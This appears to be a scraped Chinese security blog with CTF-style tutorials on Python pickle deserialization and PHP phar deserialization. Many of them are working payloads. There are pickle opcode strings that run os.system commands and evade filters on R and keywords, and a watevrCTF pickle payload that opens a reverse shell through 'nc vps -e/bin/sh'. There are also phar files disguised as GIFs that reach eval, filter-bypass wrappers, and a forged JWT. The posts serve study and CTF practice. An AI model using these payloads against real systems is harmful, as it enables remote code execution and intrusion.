cbuiltins dict X\\x03\\x00\\x00\\x00get\\x86R(cbuiltins globals )RS'pickle' tRS'loads' tRC\\x19cos system (S'whoami' tR.\\x85R.\" restricted_loads(opcode2) ### xiaoh\\34946 思路二虽然相比思路一稍许麻烦，但是我们通过构造pickle.loads()来*unpickle*任意opcode。虽然find_class会对字节码c导入模块的时候进行检查，但我们构造pickle.loads()时并没有违反find_class的规则。并且当调用我们构造的字节码形式的pickle.loads(payloads)时，并不会触发find_class。所以只要我们能够构造出pickle.loads()，理论上我们是可以执行任意字节码的。 7.2 绕过R指令 以上方法虽然能够绕过对module和一些危险函数的限制，但本质上仍然是对__reduce__函数的延伸。倘若将字节码R也禁用了，那我们怎么进行RCE呢？ 如果你还记得我上文所说的pickle漏洞命令执行的几种方法的话，你肯定能立即想到和函数执行有关的字节码R、i、o。实际上，如果没有R指令，我们同样能够进行函数执行。有下面这样一个例子 import pickle import stao class Animal: def __init__(self, name, category): self.name = name self.category = category def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.category def check(data): if b'R' in data: return 'no reduce!' x=pickle.loads(data) if(x!= Animal(stao.name,stao.age)): print('not equal') return print('well done! {} {}'.format(stao.name,stao.age)) #stao.py name=\"stao\" age=18 这里禁用了R指令，但是我们仍有方法初始化一个Animal对象。上文提到过，使用R指令实例化对象的过程，实际上就是调用构造函数的过程，本质上也是函数执行，所以我们同样能够使用其他指令绕过。 i指令 相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象） opcode=b'''(S'stao' I18 i__main__ Animal .''' o指令 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） opcode=b'''(c__main__ Animal S'stao' I18 o.''' 假如这里我们不知道stao模块的内容，我们可以通过变量覆盖的方式将原有stao中的变量覆盖掉。 opcode=b'''c__main__ stao (S'name' S'Hacker' S'age' I18 db(c__main__ Animal S'Hacker' I18 o.''' b指令 其实我们在上文已经使用过了b指令，当时他的作用是用来更新栈上的一个字典进行变量覆盖。实际上官方对它的解释是BUILD，当PVM解析到b指令时执行__setstate__或者__dict__.update()。 BUILD = b'b' # call __setstate__ or __dict__.update() 那什么是__setstate__呢？官方文档中，如果想要存储对象的状态，就可以使用__getstat__和__setstat__方法。由于pickle同样可以存储对象属性的状态，所以这两个魔术方法主要是针对那些不可被序列化的状态，如一个被打开的文件句柄open(file,'r')。 我们来看下面的例子 import pickle class Person: def __init__(self, name, age=0): self.name = name self.age = age def __str__(self): return f\"name: {self.name} age: {self.age}\" class Child(Person): def __setstate__(self, state): print(\"invoke __setstate__\") self.name=state self.age=10 def __getstate__(self): print(\"invoke __getstate__\") return \"Child\" c1=Child(\"TEST\") print(c1) #name: TEST #age: 0 opcode=pickle.dumps(c1,protocol=0) print(opcode) #invoke __getstate__ #b'ccopy_reg _reconstructor p0 (c__main__ Child p1 c__builtin__ object p2 Ntp3 Rp4 VChild p5 b.' c2=pickle.loads(opcode) print(c2) #invoke __setstate__ #name: Child #age: 10 当对象被序列化时调用__getstate__，被反序列化时调用__setstate__。重写时可以省略__setstate__，但__getstate__必须返回一个字典。如果__getstate__与__setstate__都被省略, 那么就默认自动保存和加载对象的属性字典__dict__。 在pickle源码中，字节码b对应的是load_build()函数 def load_build(self): stack = self.stack state = stack.pop() #首先获取栈上的字节码b前的一个元素，对于对象来说，该元素一般是存储有对象属性的dict inst = stack[-1] #获取该字典中键名为\"__setstate__\"的value setstate = getattr(inst, \"__setstate__\", None) #如果存在，则执行value(state) if setstate is not None: setstate(state) return slotstate = None if isinstance(state, tuple) and len(state) == 2: state, slotstate = state #如果\"__setstate__\"为空，则state与对象默认的__dict__合并，这一步其实就是将序列化前保存的持久化属性和对象属性字典合并 if state: inst_dict = inst.__dict__ intern = sys.intern for k, v in state.items(): if type(k) is str: inst_dict[intern(k)] = v else: inst_dict[k] = v #如果__setstate__和__getstate__都没有设置，则加载默认__dict__ if slotstate: for k, v in slotstate.items(): setattr(inst, k, v) dispatch[BUILD[0]] = load_build 那么这有什么安全问题呢？如果我们将字典{\"__setstate__\":os.system}，压入栈中，并执行b字节码，，由于此时并没有__setstate__，所以这里b字节码相当于执行了__dict__.update，向对象的属性字典中添加了一对新的键值对。如果我们继续向栈中压入命令command，再次执行b字节码时，由于已经有了__setstate__，所以会将栈中字节码b的前一个元素当作state，执行__setstate__(state)，也就是os.system(command)。 Payload如下 opcode=b'''(c__main__ Animal S'Casual' I18 o}(S\"__setstate__\" #向栈中压入一个空字典，然后再通过u修改为{\"__setstate__\":os.system} cos system ubS\"whoami\" b.''' 执行结果如下，成功RCE import pickle import stao import pickletools class Animal: def __init__(self, name, category): self.name = name self.category = category def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.category def check(data): if b'R' in data: return 'no reduce!' x=pickle.loads(data) if(x!= Animal(stao.name,stao.age)): print('not equal') return print('well done! {} {}'.format(stao.name,stao.age)) opcode=b'''(c__main__ Animal S'Casual' I18 o}(S\"__setstate__\" cos system ubS\"whoami\" b.''' check(opcode) pickletools.dis(opcode) ### xiaoh\\34946 not equal 0: ( MARK 1: c GLOBAL '__main__ Animal' 18: S STRING 'Casual' 28: I INT 18 32: o OBJ (MARK at 0) 33: } EMPTY_DICT 34: ( MARK 35: S STRING '__setstate__' 51: c GLOBAL 'os system' 62: u SETITEMS (MARK at 34) 63: b BUILD 64: S STRING 'whoami' 74: b BUILD 75: . STOP highest protocol among opcodes = 1 7.3 绕过关键字过滤 在某些情况下，假如我们想利用opcode进行变量覆盖从而进行身份伪造，但是代码中过滤了我们想要覆盖的属性关键字。比如[2022强网杯 crash]，关键代码如下 class User: def __init__(self, username,password): self.username=username self.token=hash(password) @app.route('/balancer', methods=['GET', 'POST']) def flag(): pickle_data=base64.b64decode(request.cookies.get(\"userdata\")) if b'R' in pickle_data or b\"secret\" in pickle_data: return \"You damm hacker!\" os.system(\"rm -rf *py*\") userdata=pickle.loads(pickle_data) if userdata.token!=hash(get_password(userdata.username)): return \"Login First\" if userdata.username=='admin': return \"Welcome admin, here is your next challenge!\" return \"You're not admin!\" 源码引入admin模块，其中存放了属性secret。现在题目过滤了属性名，现在如何进行绕过呢？下面给出三种思路 利用V指令进行Unicode绕过 V`指令的用法如下，类似于指令`S 正常我们可以构造变量覆盖如下来绕过比较 b'''capp admin (S'secret' I1 db0(capp User S\"admin\" I1 o.''' 过滤了secret之后可以构造如下 b'''capp admin (Vsecr\\u0065t I1 db0(capp User S\"admin\" I1 o.''' 十六进制绕过 操作码S也能够识别十六进制字符串，可以构造如下 b'''capp admin (S'\\x73ecret' I1 db0(capp User S\"admin\" I1 o.''' 利用内置函数获取关键字 对于已导入的模块，我们可以通过sys.modules['xxx']来获取该模块，然后通过内置函数dir()来列出模块中的所有属性 print(dir(sys.modules['admin'])) #['__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'secret'] 可以看到模块中的属性是以列表的形式输出，且我们所需的字符串位于列表末尾。 由于pickle不支持列表索引、字典索引，所以我们不能直接获取所需的字符串。在Python中，我们可以通过reversed()函数来将列表逆序，并返回一个迭代对象 然后我们可以通过next()函数来获取迭代对象的下一个元素，默认从第一个元素开始。最终可以构造如下 print(next(reversed(dir(sys.modules['admin'])))) #secret 这类似PHP的无参数RCE opcode构造如下 opcode=b'''(((((c__main__ admin i__builtin__ dir i__builtin__ reversed i__builtin__ next .''' print(pickle.loads(opcode)) #secret 获取到了secret字符串，下面就容易构造变量覆盖了 opcode = b'''c__main__ admin (((((c__main__ admin i__builtin__ dir i__builtin__ reversed i__builtin__ next I1 db(S'admin' I1 i__main__ User .''' 0x08 pker使用说明 8.1 简介 pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在https://github.com/eddieivan01/pker下载源码。 使用pker，我们可以更方便地编写pickle opcode（生成pickle版本0的opcode）。 再次建议，在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。 此外，pker的实现用到了python的ast（抽象语法树）库，抽象语法树也是一个很重要东西，有兴趣的可以研究一下ast库和pker的源码，由于篇幅限制，这里不再叙述。 8.2 pker能做的事 引用自https://xz.aliyun.com/t/7012#toc-5： 变量赋值：存到memo中，保存memo下标和变量名即可 函数调用 类型字面量构造 list和dict成员修改 对象成员变量修改 具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。 8.3 使用方法与示例 pker中的针对pickle的特殊语法需要重点掌握（后文给出示例） 此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。 pker主要用到GLOBAL、INST、OBJ三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用： 以下module都可以是包含`.`的子module 调用函数时，注意传入的参数类型要和示例一致 对应的opcode会被生成，但并不与pker代码相互等价 GLOBAL 对应opcode：b'c' 获取module下的一个全局对象（没有import的也可以，比如下面的os）： GLOBAL('os', 'system') 输入：module,instance(callable、module都是instance) INST 对应opcode：b'i' 建立并入栈一个对象（可以执行一个函数）： INST('os', 'system', 'ls') 输入：module,callable,para OBJ 对应opcode：b'o' 建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））： OBJ(GLOBAL('os', 'system'), 'ls') 输入：callable,para xxx(xx,...) 对应opcode：b'R' 使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用） li[0]=321 或 globals_dic['local_var']='hello' 对应opcode：b's' 更新列表或字典的某项的值 xx.attr=123 对应opcode：b'b' 对xx对象进行属性设置 return 对应opcode：b'0' 出栈（作为pickle.loads函数的返回值）： return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组） 注意： 由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为左值，需要索引时只能先获取相应的函数（如getattr、dict.get）才能进行。但是因为存在s、u、b操作符，作为右值是可以的。即“查值不行，赋值可以”。 pker解析S时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode: test=\"123\" return test 被解析为： b\"S'123' p0 0g0 .\" pker：全局变量覆盖 覆盖直接由执行文件引入的secret模块中的name与category变量： secret=GLOBAL('__main__', 'secret') # python的执行文件被解析为__main__对象，secret在该对象从属下 secret.name='1' secret.category='2' 覆盖引入模块的变量： game = GLOBAL('guess_game', 'game') game.curr_ticket = '123' 接下来会给出一些具体的基本操作的实例。 pker：函数执行 通过b'R'调用： s='whoami' system = GLOBAL('os', 'system') system(s) # `b'R'`调用 return 通过b'i'调用： INST('os', 'system', 'whoami') 通过b'c'与b'o'调用： OBJ(GLOBAL('os', 'system'), 'whoami') 多参数调用函数 INST('[module]', '[callable]'[, par0,par1...]) OBJ(GLOBAL('[module]', '[callable]')[, par0,par1...]) pker：实例化对象 实例化对象是一种特殊的函数执行 animal = INST('__main__', 'Animal','1','2') return animal # 或者 animal = OBJ(GLOBAL('__main__', 'Animal'), '1','2') return animal 其中，python原文件中包含： class Animal: def __init__(self, name, category): self.name = name self.category = category 也可以先实例化再赋值： animal = INST('__main__', 'Animal') animal.name='1' animal.category='2' return animal 手动辅助 拼接opcode：将第一个pickle流结尾表示结束的.去掉，两者拼接起来即可。 建立普通的类时，可以先pickle.dumps，再拼接至payload。 8.4 CTF实战 在实际使用pker时，首先需要有大概的思路，保证能做到手写每一步的opcode，然后使用pker对思路进行实现。 [CISCN2019 华北赛区 Day1 Web2]ikun 首先是一个脚本爆破 首页告诉我们要卖到lv6，那我们首先得找到它，由于页面很多，手动不现实，故此需要脚本找 import requests import time for i in range(0, 2000): time.sleep(0.5) url = 'http://dfb21cdf-d431-4926-b0fa-b5d1905ac641.node4.buuoj.cn:81/shop?page={}'.format(i) res = requests.get(url) if 'lv6.png' in res.text: print(\"找到lv6----{}\".format(i)) 如上图在181页，我们访问看看，我们在结算的时候抓包看看 如上图我们修改折扣进行购买，随后看到右侧有个重定向，我们访问看看b1g_m4mber 看到这里只允许admin访问，又看到其中有jwt，那毫无疑问就是伪造jtw了，那首先我们先要拿到secret，这里也是看wp发现是通过爆破找到secret的，直接上工具： github链接https://github.com/brendan-rius/c-jwt-cracker 用法这里就不赘述了，如上图可以看到secret是1Kun 如上图进行伪造之后发送到bp： eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.sxEqhTA_xPDDL_4t8tiMNUIALRjMHxFOsKkzUOc1MPA 发送之后是如下页面： 成功以admin身份登录，接下来看一下源代码发现存在www.zip我们下载看看 如果我们上述成功的话，就会得到源码，我们找到Admin.py看到如下代码 import tornado.web from sshop.base import BaseHandler import pickle import urllib class AdminHandler(BaseHandler): @tornado.web.authenticated def get(self, *args, **kwargs): if self.current_user == \"admin\": return self.render('form.html', res='This is Black Technology!', member=0) else: return self.render('no_ass.html') @tornado.web.authenticated def post(self, *args, **kwargs): try: become = self.get_argument('become') p = pickle.loads(urllib.unquote(become)) return self.render('form.html', res=p, member=1) except: return self.render('form.html', res='This is Black Technology!', member=0) 分析可以知道，只有我们用户为admin，随后向become进行传参，内容为序列化内容之后由于render的存在，我们可以执行恶意代码，payload如下 import pickle import urllib class pop(object): def __reduce__(self): return(eval, (\"open('/flag.txt', 'r').read()\", )) poc = pop() s = pickle.dumps(poc) print(urllib.qoute(s))#注意上述题目中的p参数是经过urllib.unquote函数处理的 之后在python2环境下运行，向become传参即可 这里点击页面的一键成为大会员之后抓包，修改become参数，拿到flag Bandit-自动化工具 Bandit 是一款旨在查找 Python 代码中常见安全问题的工具。为此，Bandit 处理每个文件，从中构建 AST，并针对 AST 节点运行适当的插件。一旦 Bandit 完成扫描所有文件，它就会生成一份报告。 我们可以利用上述工具来进行自动的代码审计，看看上述工具是否可以分析出来源码中含有pickle漏洞 bandit -r 需要分析的文件路径 如上图，的确跟我们手工分析的注入点一致 [watevrCTF-2019]Pickle Store 刚开始提示我们要买pickle这个东西，但我用bp抓包只是发现了cookie以及id在变化，看着像base64，但解密却是一堆乱码，于是看了wp发现这是先pickle序列化后在base解密的，那就好办了，写一个简单脚本即可 import pickle import base64 result = 'gAN9cQAoWAUAAABtb25leXEBS2RYBwAAAGhpc3RvcnlxAl1xAyhYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQRYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQVYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQZYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQdlWBAAAABhbnRpX3RhbXBlcl9obWFjcQhYIAAAADU3YzExYTRmMTE4YmM2Yzc5YmFmNjI2NWE5MWI5NWQwcQl1Lg==' result = base64.b64decode(result) result = pickle.loads(result) print(result) 解密出来为： {'money': 100, 'history': ['Yummy smörgåsgurka', 'Yummy smörgåsgurka', 'Yummy smörgåsgurka', 'Yummy smörgåsgurka'], 'anti_tamper_hmac': '57c11a4f118bc6c79baf6265a91b95d0'} 这里看到个hmac搜了搜是个算法什么的，也没具体了解就看wp了，这里他们说这种算法也没法利用了，可以直接将一段恶意的pickle代码base64编码后放到cookie进行getshell。因为这里是buu环境，内部靶机不出网，所以也懒得去开小号啥的，就看个思路，payload如下： import pickle class Demo(object): def __reduce__(self): return(eval, (\"__import__('os').system('nc vps -e/bin/sh')\",)) pop = Demo() print(base64.b64encode(pickle.dumps(pop))) #输出 b'gASVRwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwrX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIHZwcyAtZS9iaW4vc2gnKZSFlFKULg==' 之后反弹成功进行getshell即可 参考：https://www.cnblogs.com/h3zh1/p/12698897.html 其他方法可也参考：https://xz.aliyun.com/t/7320 总的来说，学phar反序列化任重而道远，虽然总结了这么多，但消化的感觉挺少，以后会多找点这种题目的，继续更新这篇文章（毕竟质量太辣鸡） 0x09 参考文章 pickle反序列化初探 Python反序列化漏洞分析 最近碰到的 Python pickle 反序列化小总结 – pickle pass可参考 Pickle反序列化 利用python反序列化覆盖秘钥——watevrCTF-2019:Pickle Store的第二种解法","tags":["基本知识"],"categories":["web知识总结"]},{"title":"Phar反序列化","path":"/2023/11/13/phar-fan-xu-lie-hua-xue-xi/","content":"0x01 前言 这里依旧是打比赛的时候，遇到了多次phar反序列化知识，虽然此前了解过，但感觉学的不够深刻，借此来增进一下记忆，顺便看看能进阶到哪里。 本文质量不高，我纯垃圾，只为让自己学懂，见谅！ 0x02 原理分析 看到一位师傅说phar反序列化，多出现在tp框架的反序列化漏洞中，这似乎又在暗示我，得学习一波tp了！ 关于这个方法在去年 BlackHat 大会上的 Sam Thomas 分享了 File Operation Induced Unserialization via the “phar://” Stream Wrapper ，该研究员指出该方法在 文件系统函数 （ file_get_contents 、 unlink 等）参数可控的情况下，配合 phar://伪协议 ，可以不依赖反序列化函数 unserialize() 直接进行反序列化的操作。 2.1 phar文件分析 在了解原理之前，查询了一下官方手册，手册里针对 phar:// 这个伪协议是这样介绍的。 Phar归档文件最有特色的特点是可以方便地将多个文件分组为一个文件。这样，phar归档文件提供了一种将完整的PHP应用程序分发到单个文件中并从该文件运行它的方法，而无需将其提取到磁盘中。此外，PHP可以像在命令行上和从Web服务器上的任何其他文件一样轻松地执行phar存档。 Phar有点像PHP应用程序的拇指驱动器。（译文） 简单理解 phar:// 就是一个类似 file:// 的流包装器，它的作用可以使得多个文件归档到统一文件，并且在不经过解压的情况下被php所访问，并且执行。 下面看一下phar文件的结构：大体来说 Phar 结构由4部分组成 1.stub ：phar文件标识 &lt;?php Phar::mapPhar(); include 'phar://phar.phar/index.php'; __HALT_COMPILER(); ?&gt; 可以理解为一个标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。也就是说如果我们留下这个标志位，构造一个图片或者其他文件，那么可以绕过上传限制，并且被 phar 函数识别利用。 2. a manifest describing the contents phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。 3. the file contents 被压缩文件的内容。 4. [optional] a signature for verifying Phar integrity (phar file format only) 签名，放在文件末尾，格式如下： 2.2 demo测试 根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。 注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。 但看了其他的文章说，同时要保证PHP版本&gt;5.3.0 phar_gen.php &lt;?php class TestObject { } @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); ?&gt; 这里对test.txt那一行代码产生了疑惑：为何要存在这一行代码？问了GPT，回答如下： 这行代码是为了在 PHAR 文件中包含一个示例文件，以便在需要时可以从 PHAR 归档中提取和使用这个文件。 emmm暂时还是理解不，先继续往下学吧 可以明显的看到meta-data是以序列化的形式存储的： 有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下： 这里看着佬看起了底层代码实现逻辑，但目前的我肯定看不懂，因此这里我抱着看懂大概，跟着看着学的心态了。 来看一下php底层代码是如何处理的： php-src/ext/phar/phar.c 看不懂，但能猜到上述箭头处是对我们phar文件中的metadata数据进行反序列化操作。 这里借用佬的例子证明了（不想费时间写了。。。 phar_test1.php &lt;?php class TestObject { public function __destruct() { echo 'Destruct called'; } } $filename = 'phar://phar.phar/test.txt'; file_get_contents($filename); ?&gt; 其他函数当然也是可行的： phar_test2.php &lt;?php class TestObject { public function __destruct() { echo 'Destruct called'; } } $filename = 'phar://phar.phar/a_random_string'; file_exists($filename); //...... ?&gt; 当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，一些之前看起来“人畜无害”的函数也变得“暗 藏杀机”，极大的拓展了攻击面。 2.3 将phar伪造成其他格式的文件 在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。 &lt;?php class TestObject { } @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"GIF89a\".\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub $o = new TestObject(); $o-&gt;data='hello hybcx!'; $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); ?&gt; 那么我们看看这个假装自己是图片的phar文件最后的效果。 &lt;?php include('phar://phar.jpg'); class TestObject { function __destruct() { echo $this-&gt;data; } } ?&gt; 成功反序列化识别文件内容，采用这种方法可以绕过很大一部分上传检测。 2.4 触发反序列化的文件操作函数 我们继续跟着那位师傅再次分析一波文件操作函数 受影响函数如下： 为什么 Phar 会反序列化处理文件并且在文件操作中能够成功反序列化呢？这里需要通过php底层代码才能知道，关于这个问题ZSX师傅的 Phar与Stream Wrapper造成PHP RCE的深入挖掘已经详细分析了。这里通过一个demo论证一下上述结论。仍然以上面的phar文件为例 &lt;?php class TestObject { public function __destruct() { echo $this-&gt;data; echo 'Destruct called'; } } $filename = 'phar://phar.phar/test.txt'; file_get_contents($filename); ?&gt; 这里可以看到已经反序列化成功触发__destruct方法并且读取了文件内容。其他函数也是可以的，就不一一试了， 如果题目限制了，phar://不能出现在头几个字符。可以用Bzip / Gzip协议绕过。 $filename = 'compress.zlib://phar://phar.phar/test.txt'; 虽然会警告但仍会执行，它同样适用于compress.bzip2://。 当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，极大的拓展了反序列化攻击面。 2.5 触发反序列化之操作文件的touch 这里也是直接借用师傅们的总结了，以下使用均是佬们从源码当中分析出来的，我这里就直接cv了。。。 它们都有一个共同特征，就是调用了php_stream_locate_url_wrapper。但是这个不那么好用，换php_stream_open_wrapper更合适点。让我们搜索一下PHP源代码吧， 我们很快就能发现，操作文件的touch，也是能触发它的。不看文件了，我们假设文件全部都能用。 exif exif_thumbnail exif_imagetype gd imageloadfont imagecreatefrom*** hash hash_hmac_file hash_file hash_update_file md5_file sha1_file file / url get_meta_tags get_headers standard getimagesize getimagesizefromstring zip $zip = new ZipArchive(); $res = $zip-&gt;open('c.zip'); $zip-&gt;extractTo('phar://test.phar/test'); 0x03 举例分析 3.1 本地测试 利用条件. 任何漏洞或攻击手法不能实际利用，都是纸上谈兵。在利用之前，先来看一下这种攻击的利用条件。 1.phar文件要能够上传到服务器端。 2.如`file_exists()，fopen()，file_get_contents()，file()`等文件操作的函数要有可用的魔术方法作为\"跳板\"。 3.文件操作函数的参数可控，且:`:、/、phar`等特殊字符没有被过滤。 这里先用smi1e师傅的demo做个例子。 php反序列化攻击拓展 例一、 upload_file.php后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif &lt;?php if (($_FILES[\"file\"][\"type\"]==\"image/gif\")&amp;&amp;(substr($_FILES[\"file\"][\"name\"], strrpos($_FILES[\"file\"][\"name\"], '.')+1))== 'gif') { echo \"Upload: \" . $_FILES[\"file\"][\"name\"]; echo \"Type: \" . $_FILES[\"file\"][\"type\"]; echo \"Temp file: \" . $_FILES[\"file\"][\"tmp_name\"]; if (file_exists(\"upload_file/\" . $_FILES[\"file\"][\"name\"])) { echo $_FILES[\"file\"][\"name\"] . \" already exists. \"; } else { move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload_file/\" .$_FILES[\"file\"][\"name\"]); echo \"Stored in: \" . \"upload_file/\" . $_FILES[\"file\"][\"name\"]; } } else { echo \"Invalid file,you can only upload gif\"; } upload_file.html &lt;html&gt; &lt;body&gt; &lt;form action=\"http://localhost/upload_file.php\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"file\" name=\"file\" /&gt; &lt;input type=\"submit\" name=\"Upload\" /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; un.php存在file_exists()，并且存在__destruct() &lt;?php highlight_file(__FILE__); $filename=@$_GET['filename']; echo 'please input a filename'.'&lt;br /&gt;'; class AnyClass{ var $output = 'echo \"ok\";'; function __destruct() { eval($this -&gt; output); } } if(file_exists($filename)){ $a = new AnyClass(); } else{ echo 'file is not exists'; } ?&gt; 该demo环境存在两个点，第一存在文件上传，只能上传gif图，第二存在魔术方法__destruct()以及文件操作函数file_exists()，而 且在AnyClass类中调用了eval，以此用来命令执行，我们知道以上条件正好满足利用条件。 根据un.php写一个生成phar的php文件，在文件头加上GIF89a绕过gif，然后我们访问这个php文件后，生成了phar.phar，修改后缀为 gif，上传到服务器，然后利用file_exists，使用phar://执行代码 poc.php &lt;?php class AnyClass{ var $output = 'echo \"ok\";'; } @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"GIF89a\".\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub $o = new AnyClass(); $o-&gt;output='phpinfo();'; $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); ?&gt; 这里搞完，发现那位师傅就去分析了tp5.2版本的pop链对phar反序列化的利用，由于这里我没学习tp框架，暂时不搞了，后续学了再来更新 3.2 导致phar触发的其他地方(sql) Postgres &lt;?php $pdo = new PDO(sprintf(\"pgsql:host=%s;dbname=%s;user=%s;password=%s\", \"127.0.0.1\", \"test\", \"root\", \"root\")); @$pdo-&gt;pgsqlCopyFromFile('aa', 'phar://test.phar/aa'); 当然，pgsqlCopyToFile和pg_trace同样也是能使用的，只是它们需要开启phar的写功能。 MySQL LOAD DATA LOCAL INFILE也会触发phar造成反序列化，在今年的TSec 2019 议题 PPT：Comprehensive analysis of the mysql client attack chain，上面说的N1CTF2019 题目sql_manage考的也是这个点，我们仍然使用最上面那个例子。 &lt;?php class TestObject { function __destruct() { echo $this-&gt;data; echo 'Destruct called'; } } // $filename = 'compress.zlib://phar://phar.phar/test.txt'; // file_get_contents($filename); $m = mysqli_init(); mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true); $s = mysqli_real_connect($m, 'localhost', 'root', 'root', 'test', 3306); $p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \\'phar://phar.phar/test.txt\\' INTO TABLE users LINES TERMINATED BY \\'\\r \\' IGNORE 1 LINES;'); ?&gt; 再配置一下mysqld。 [mysqld] local-infile=1 secure_file_priv=\"\" 这里由于我懒得配置mysql了，就借用师傅的图吧。。。 可以看到mysql进行phar文件读取时成功触发反序列化。 0x04 实战例题 等遇到的时候补充吧。。。 0x05 绕过总结 5.1 phar关键词绕过 // Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过 compress.bzip://phar:///test.phar/test.txt compress.bzip2://phar:///home/sx/test.phar/test.txt compress.zlib://phar:///home/sx/test.phar/test.txt php://filter/resource=phar:///test.phar/test.txt // 还可以使用伪协议的方法绕过 php://filter/read=convert.base64-encode/resource=phar://phar.phar 5.2 __HALT_COMPILER关键词绕过 if (preg_match(\"/&lt;/?|php|HALT_COMPILER/i\",$filename){ die(); } 因为phar中的a stub字段必须以__HALT_COMPILER();字符串来结尾，否则phar扩展将无法识别这个文件为phar文件，所以这段字符串不能省略，只能绕过 方法一： 首先将 phar 文件使用 gzip 命令进行压缩，可以看到压缩之后的文件中就没有了__HALT_COMPILER()，将 phar.gz 后缀改为 png（png文件可以上传） 文件上传成功后，利用文件包含漏洞包含文件 file_un.php?filename=phar://pic/phar.phar.gz/phar.phar # file_un.php中包含__destruct并且可以被触发 方法二： 将phar的内容写进压缩包注释中，也同样能够反序列化成功，压缩为zip也会绕过该正则 &lt;?php $phar_file = serialize($exp); echo $phar_file; $zip = new ZipArchive(); $res = $zip-&gt;open('1.zip',ZipArchive::CREATE); $zip-&gt;addFromString('crispr.txt', 'file content goes here'); $zip-&gt;setArchiveComment($phar_file); $zip-&gt;close(); ?&gt; 这篇文章在php源码角度给出分析：https://www.anquanke.com/post/id/240007 phar反序列化过程中，对metadata进行解析的时候会进行php_var_unserialize()将Phar中的metadata进行反序列化 0x06 参考文章 利用 phar 拓展 php 反序列化漏洞攻击面 php反序列化拓展攻击详解–phar php phar反序列化总结 Phar与Stream Wrapper造成PHP RCE的深入挖掘","tags":["基本知识"],"categories":["web知识总结"]},{"title":"Flask-PIN码学习","path":"/2023/11/12/flask-pin-ma-xue-xi/","content":"0x01 PIN是什么 以下的一切硬性知识基本都是照搬的（因为自己还很菜，且也未尝试去自己总结）故此，就以理解别人文章为准则了，还请见谅~ PIN是 Werkzeug（它是 Flask 的依赖项之一）提供的额外安全措施，以防止在不知道 PIN 的情况下访问调试器。 您可以使用浏览器中的调试器引脚来启动交互式调试器。 请注意，无论如何，您都不应该在生产环境中使用调试模式，因为错误的堆栈跟踪可能会揭示代码的多个方面。 调试器 PIN 只是一个附加的安全层，以防您无意中在生产应用程序中打开调试模式，从而使攻击者难以访问调试器。 ——来自StackOverFlow回答 werkzeug不同版本以及python不同版本都会影响PIN码的生成 